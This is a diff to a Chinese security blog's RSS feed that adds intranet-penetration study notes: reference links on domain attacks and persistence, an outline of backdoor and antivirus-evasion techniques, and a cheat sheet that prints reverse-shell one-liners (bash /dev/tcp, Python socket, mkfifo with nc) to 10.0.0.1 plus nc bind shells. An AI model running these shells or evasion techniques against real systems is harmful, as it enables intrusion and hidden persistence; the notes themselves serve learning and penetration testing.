@@ -5,14 +5,15 @@
         <link>https://mobius-0.github.io</link>
         <description>GLHF</description>
         <language>zh-CN</language>
-        <pubDate>Mon, 28 Nov 2022 21:35:20 +0800</pubDate>
-        <lastBuildDate>Mon, 28 Nov 2022 21:35:20 +0800</lastBuildDate>
+        <pubDate>Tue, 29 Nov 2022 16:03:20 +0800</pubDate>
+        <lastBuildDate>Tue, 29 Nov 2022 16:03:20 +0800</lastBuildDate>
         <category>Hexo</category>
         <category>shoya</category>
         <category>网站</category>
         <category>网络安全</category>
         <category>工具</category>
         <category>虚拟机</category>
+        <category>安全</category>
         <category>星际争霸2</category>
         <category>平衡</category>
         <category>杂谈</category>
@@ -21,6 +22,17 @@
         <category>龙族</category>
         <category>动画</category>
         <category>法律法规</category>
+        <category>XSS</category>
+        <category>漏洞</category>
+        <category>渗透测试</category>
+        <category>靶场</category>
+        <category>pikachu</category>
+        <category>虚拟化</category>
+        <category>Docker</category>
+        <category>镜像</category>
+        <category>标准</category>
+        <category>OCI</category>
+        <category>CRI</category>
         <category>域名</category>
         <category>DNS</category>
         <category>WEB</category>
@@ -33,11 +45,41 @@
         <category>WiFi</category>
         <category>邮件</category>
         <category>网络协议</category>
+        <category>入侵检测</category>
+        <category>IDS</category>
+        <category>IPS</category>
+        <category>防御加固</category>
+        <category>管理策略</category>
+        <category>分工</category>
+        <category>职能</category>
+        <category>情报</category>
+        <category>运营</category>
+        <category>开发过程</category>
+        <category>应急响应</category>
+        <category>流程</category>
         <category>Linux</category>
+        <category>Windows</category>
+        <category>攻击溯源</category>
+        <category>分析模型</category>
+        <category>网络攻防</category>
+        <category>蜜罐</category>
+        <category>隐藏</category>
+        <category>诱导</category>
+        <category>防御纵深</category>
+        <category>访问控制</category>
+        <category>过滤</category>
+        <category>框架</category>
+        <category>风险</category>
+        <category>控制</category>
         <category>渗透</category>
         <category>信息收集</category>
         <category>痕迹清理</category>
-        <category>Windows</category>
+        <category>内网</category>
+        <category>后门</category>
+        <category>免杀</category>
+        <category>代理</category>
+        <category>Shell</category>
+        <category>远程连接</category>
         <category>ASP</category>
         <category>CSharp</category>
         <category>Golang</category>
@@ -53,14 +95,11 @@
         <category>PowerShell</category>
         <category>Python</category>
         <category>Ruby</category>
-        <category>Shell</category>
-        <category>漏洞</category>
         <category>CSRF</category>
         <category>服务器</category>
         <category>SQL注入</category>
         <category>SSRF</category>
         <category>Cache</category>
-        <category>XSS</category>
         <category>XXE</category>
         <category>XML</category>
         <category>Xpath</category>
@@ -82,6 +121,326 @@
         <category>端口</category>
         <category>社会工程学</category>
         <category>搜索</category>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/</guid>
+            <title>参考文档</title>
+            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/</link>
+            <category>内网</category>
+            <pubDate>Tue, 29 Nov 2022 16:03:20 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;windows&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows&#34;&gt;#&lt;/a&gt; Windows&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi8=&#34;&gt;Windows 威胁防护&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naDBzdC5jbi9hcmNoaXZlcy8yMDE3LTAzLTI5LzE=&#34;&gt;文件寄生 NTFS 文件流实际应用&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ2MQ==&#34;&gt;Windows 中常见后门持久化方法总结&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8vIw==&#34;&gt;LOLBAS&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLzNnc3R1ZGVudC5naXRodWIuaW8vJUU2JUI4JTk3JUU5JTgwJThGJUU2JThBJTgwJUU1JUI3JUE3LVdpbmRvd3MlRTUlOEQlOTUlRTYlOUQlQTElRTYlOTclQTUlRTUlQkYlOTclRTclOUElODQlRTUlODglQTAlRTklOTklQTQv&#34;&gt;渗透技巧 ——Windows 单条日志的删除&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzE1NQ==&#34;&gt;windows 取证 文件执行记录的获取和清除&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZGFya29wZXJhdG9yLmNvbS9ibG9nLzIwMjAvMS8xNC9nZXR0aW5nLWRucy1jbGllbnQtY2FjaGVkLWVudHJpZXMtd2l0aC1jaW13bWk=&#34;&gt;Getting DNS Client Cached Entries with CIM/WMI&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9sZW5namliby5naXRodWIuaW8vUGVyc2lzdGVuY2Uv&#34;&gt;Windows 单机 Persistence&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAyMS8wNS8yNC9kdW1waW5nLXJkcC1jcmVkZW50aWFscy8=&#34;&gt;Dumping RDP Credentials&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;域渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域渗透&#34;&gt;#&lt;/a&gt; 域渗透&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvMjUxMC5odG1s&#34;&gt;绕过域账户登录失败次数的限制&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpnM056RTVPVEE1TlE9PSZhbXA7bWlkPTIyNDc0ODM4MDcmYW1wO2lkeD0xJmFtcDtzbj01OWJlNTBhYTVjYzczNWYwNTVkYjU5NjI2OWE4NTdjZQ==&#34;&gt;域渗透总结&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tZWRpdW0uY29tL0BhZGFtLnRvc2NoZXIvdG9wLWZpdmUtd2F5cy1pLWdvdC1kb21haW4tYWRtaW4tb24teW91ci1pbnRlcm5hbC1uZXR3b3JrLWJlZm9yZS1sdW5jaC0yMDE4LWVkaXRpb24tODIyNTlhYjczYWFh&#34;&gt;got domain admin on internal network&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Rvd25sb2FkLm1pY3Jvc29mdC5jb20vZG93bmxvYWQvNy83L0EvNzdBQkM1QkQtODMyMC00MUFGLTg2M0MtNkVDRkIxMENCNEI5L01pdGlnYXRpbmclMjBQYXNzLXRoZS1IYXNoJTIwKFB0SCklMjBBdHRhY2tzJTIwYW5kJTIwT3RoZXIlMjBDcmVkZW50aWFsJTIwVGhlZnQlMjBUZWNobmlxdWVzX0VuZ2xpc2gucGRm&#34;&gt;Mitigating Pass-the-Hash (PtH) Attacks and Other Credential Theft Techniques&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3Vrbm93c2VjL0FjdGl2ZS1EaXJlY3RvcnktUGVudGVzdC1Ob3Rlcw==&#34;&gt;域渗透学习笔记&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9xb21wbHguY29tL3FvbXBseC1rbm93bGVkZ2UtZnVuZGFtZW50YWxzLW9mLWFjdGl2ZS1kaXJlY3RvcnktdHJ1c3QtcmVsYXRpb25zaGlwcy8=&#34;&gt;QOMPLX Knowledge: Fundamentals of Active Directory Trust Relationships&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC84MTI3ODY4Lmh0bWw=&#34;&gt;Kerberos 的黄金票据详解&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmFsc2lkLmV1L2Rjc2hhZG93LWV4cGxhaW5lZC00NTEwZjUyZmMxOWQ=&#34;&gt;DCShadow explained: A technical deep dive into the latest AD attack technique&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8=&#34;&gt;Active Directory Security&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLnhwbnNlYy5jb20va2VyYmVyb3MtYXR0YWNrcy1wYXJ0LTEv&#34;&gt;Kerberos AD Attacks Kerberoasting&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzUxNw==&#34;&gt;Kerberos 之域内委派攻击&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NmYWx0YS9hZHNlYw==&#34;&gt;adsec&lt;/span&gt; An introduction to Active Directory security&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96ZXIxdDAuZ2l0bGFiLmlvL3Bvc3RzL2F0dGFja2luZ19hZC8=&#34;&gt;Attacking Active Directory&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc3BlY3Rlcm9wcy5pby9hc3NldHMvcmVzb3VyY2VzL0NlcnRpZmllZF9QcmUtT3duZWQucGRm&#34;&gt;Certified Pre-Owned Abusing Active Directory Certificate Services&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vYWR2YW5jZWQtdGhyZWF0LWFuYWx5dGljcy93aGF0LWlzLWF0YQ==&#34;&gt;Microsoft Advanced Threat Analytics&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzExNDczMS5odG1s&#34;&gt;Windows 内网渗透提权&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01F&#34;&gt;UACMe&lt;/span&gt; Defeating Windows User Account Control&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议&#34;&gt;#&lt;/a&gt; 协议&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RjZXJwYy9kY2VycGM=&#34;&gt;DEC/RPC&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWRjYW5hcnkuY29tL2Jsb2cvbXNycGMtdG8tYXR0YWNrLw==&#34;&gt;The dark side of Microsoft Remote Procedure Call protocols&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;redteam&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#redteam&#34;&gt;#&lt;/a&gt; RedTeam&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tsaW9uc2VjL1JlZFRlYW1NYW51YWw=&#34;&gt;RedTeamManual&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;内网&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网&#34;&gt;#&lt;/a&gt; 内网&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjM1NA==&#34;&gt;内网安全检查&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvOTI2NDY=&#34;&gt;我所知道的内网渗透&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2wzbTBuL3BlbnRlc3Rfc3R1ZHk=&#34;&gt;从零开始内网渗透学习&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTY0OS8=&#34;&gt;渗透技巧 从 Github 下载安装文件&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9vZmZzZWMucHJvdmFkeXMuY29tL2ludHJvLXRvLWZpbGUtb3BlcmF0aW9uLWFidXNlLW9uLVdpbmRvd3MuaHRtbA==&#34;&gt;An introduction to privileged file operation abuse on Windows&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDUyMg==&#34;&gt;脚本维权 tips&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;cobalt-strike&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cobalt-strike&#34;&gt;#&lt;/a&gt; Cobalt Strike&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cubGVhbm90ZS5jb20vcG9zdC9zbm93bWluZy9Db2JhbHQtU3RyaWtl&#34;&gt;Cobalt Strike 系列笔记&lt;/span&gt;&lt;/li&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNDE5MQ==&#34;&gt;渗透利器 Cobalt Strike 第 2 篇 APT 级的全面免杀与企业纵深防御体系的对抗&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/</guid>
+            <title>综合技巧</title>
+            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/</link>
+            <category>代理</category>
+            <category>Shell</category>
+            <category>远程连接</category>
+            <pubDate>Tue, 29 Nov 2022 15:50:20 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;端口转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口转发&#34;&gt;#&lt;/a&gt; 端口转发&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;lcx&lt;/li&gt;
+&lt;li&gt;netsh&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;portmap&lt;/li&gt;
+&lt;li&gt;iptables&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;socket 代理&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Win: xsocks&lt;/li&gt;
+&lt;li&gt;Linux: proxychains&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;基于 http 的转发与 socket 代理 (低权限下的渗透)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;端口转发: tunnasocks 代理: reGeorg&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ssh 通道&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;端口转发 socks&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;获取shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取shell&#34;&gt;#&lt;/a&gt; 获取 shell&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;常规 shell 反弹&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1
+
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.0.0.1&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;突破防火墙的 imcp_shell 反弹&lt;/li&gt;
+&lt;li&gt;正向 shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;nc -e /bin/sh -lp 1234
+nc.exe -e cmd.exe -lp 1234
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;内网文件传输&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网文件传输&#34;&gt;#&lt;/a&gt; 内网文件传输&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;windows 下文件传输&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;powershell&lt;/li&gt;
+&lt;li&gt;vbs 脚本文件&lt;/li&gt;
+&lt;li&gt;bitsadmin&lt;/li&gt;
+&lt;li&gt;文件共享&lt;/li&gt;
+&lt;li&gt;使用 telnet 接收数据&lt;/li&gt;
+&lt;li&gt;hta&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;linux 下文件传输&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;python&lt;/li&gt;
+&lt;li&gt;wget&lt;/li&gt;
+&lt;li&gt;tar + ssh&lt;/li&gt;
+&lt;li&gt;利用 dns 传输数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件编译&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;powershell 将 exe 转为 txt，再 txt 转为 exe&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;远程连接-执行程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程连接-执行程序&#34;&gt;#&lt;/a&gt; 远程连接 &amp;amp;&amp;amp; 执行程序&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;at&amp;amp;schtasks&lt;/li&gt;
+&lt;li&gt;psexec&lt;/li&gt;
+&lt;li&gt;wmic&lt;/li&gt;
+&lt;li&gt;wmiexec.vbs&lt;/li&gt;
+&lt;li&gt;smbexec&lt;/li&gt;
+&lt;li&gt;powershell remoting&lt;/li&gt;
+&lt;li&gt;SC 创建服务执行&lt;/li&gt;
+&lt;li&gt;schtasks&lt;/li&gt;
+&lt;li&gt;SMB+MOF || DLL Hijacks&lt;/li&gt;
+&lt;li&gt;PTH + compmgmt.msc&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/</guid>
+            <title>后门技术</title>
+            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF/</link>
+            <category>渗透</category>
+            <category>后门</category>
+            <category>免杀</category>
+            <pubDate>Tue, 29 Nov 2022 15:45:20 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;开发技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开发技术&#34;&gt;#&lt;/a&gt; 开发技术&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;管控功能实现技术&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;系统管理：查看系统基本信息，进程管理，服务管理&lt;/li&gt;
+&lt;li&gt;文件管理：复制 / 粘贴文件，删除文件 / 目录，下载 / 上传文件等&lt;/li&gt;
+&lt;li&gt;Shell 管理&lt;/li&gt;
+&lt;li&gt;击键记录监控&lt;/li&gt;
+&lt;li&gt;屏幕截取&lt;/li&gt;
+&lt;li&gt;音频监控&lt;/li&gt;
+&lt;li&gt;视频监控&lt;/li&gt;
+&lt;li&gt;隐秘信息查看&lt;/li&gt;
+&lt;li&gt;移动磁盘的动态监控&lt;/li&gt;
+&lt;li&gt;远程卸载&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;自启动技术&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows 自启动
+&lt;ul&gt;
+&lt;li&gt;基于 Windows 启动目录的自启动&lt;/li&gt;
+&lt;li&gt;基于注册表的自启动&lt;/li&gt;
+&lt;li&gt;基于服务程序的自启动&lt;/li&gt;
+&lt;li&gt;基于 ActiveX 控件的自启动&lt;/li&gt;
+&lt;li&gt;基于计划任务（Scheduled Tasks）的自启动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Linux 自启动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用户态进程隐藏技术&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;基于 DLL 插入的进程隐藏
+&lt;ul&gt;
+&lt;li&gt;远程线程创建技术&lt;/li&gt;
+&lt;li&gt;设置窗口挂钩（HOOK）技术&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;基于 SvcHost 共享服务的进程隐藏&lt;/li&gt;
+&lt;li&gt;进程内存替换&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;数据穿透和躲避技术&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;反弹端口&lt;/li&gt;
+&lt;li&gt;协议隧道
+&lt;ul&gt;
+&lt;li&gt;HTTP&lt;/li&gt;
+&lt;li&gt;MSN&lt;/li&gt;
+&lt;li&gt;Google Talk&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;内核级隐藏技术（Rootkit）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;磁盘启动级隐藏技术（Bootkit）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MBR&lt;/li&gt;
+&lt;li&gt;BIOS&lt;/li&gt;
+&lt;li&gt;NTLDR&lt;/li&gt;
+&lt;li&gt;boot.ini&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;还原软件对抗技术&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;后门免杀&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门免杀&#34;&gt;#&lt;/a&gt; 后门免杀&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;传统静态代码检测&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;加壳&lt;/li&gt;
+&lt;li&gt;添加花指令&lt;/li&gt;
+&lt;li&gt;输入表免杀&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;启发式代码检测&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;动态函数调用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;云查杀&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;动态增大自身体积&lt;/li&gt;
+&lt;li&gt;更改云查杀服务器域名解析地址&lt;/li&gt;
+&lt;li&gt;断网&lt;/li&gt;
+&lt;li&gt;利用散列碰撞绕过云端 “白名单”&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;攻击主防杀毒软件&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;更改系统时间&lt;/li&gt;
+&lt;li&gt;窗口消息攻击&lt;/li&gt;
+&lt;li&gt;主动发送 IRP 操纵主防驱动&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;利用证书信任&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;盗取利用合法证书&lt;/li&gt;
+&lt;li&gt;利用散列碰撞伪造证书&lt;/li&gt;
+&lt;li&gt;利用合法程序 DLL 劫持问题的 “白加黑”&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;检测技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检测技术&#34;&gt;#&lt;/a&gt; 检测技术&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;基于自启动信息的检测&lt;/li&gt;
+&lt;li&gt;基于进程信息的检测&lt;/li&gt;
+&lt;li&gt;基于数据传输的检测&lt;/li&gt;
+&lt;li&gt;Rootkit/Bootkit 的检测&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;后门分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门分析&#34;&gt;#&lt;/a&gt; 后门分析&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;动态分析&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;静态分析&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;反病毒引擎扫描&lt;/li&gt;
+&lt;li&gt;文件格式识别&lt;/li&gt;
+&lt;li&gt;文件加壳识别及脱壳&lt;/li&gt;
+&lt;li&gt;明文字符串查找&lt;/li&gt;
+&lt;li&gt;链接库及导入 / 导出函数分析&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
             <title>Linux内网渗透</title>
@@ -415,10 +774,10 @@
             <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
             <title>Windows内网渗透</title>
             <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
+            <category>Windows</category>
             <category>渗透</category>
             <category>信息收集</category>
             <category>痕迹清理</category>
-            <category>Windows</category>
             <pubDate>Mon, 28 Nov 2022 11:20:20 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
 &lt;h2 id=&#34;基本命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本命令&#34;&gt;#&lt;/a&gt; 基本命令&lt;/h2&gt;
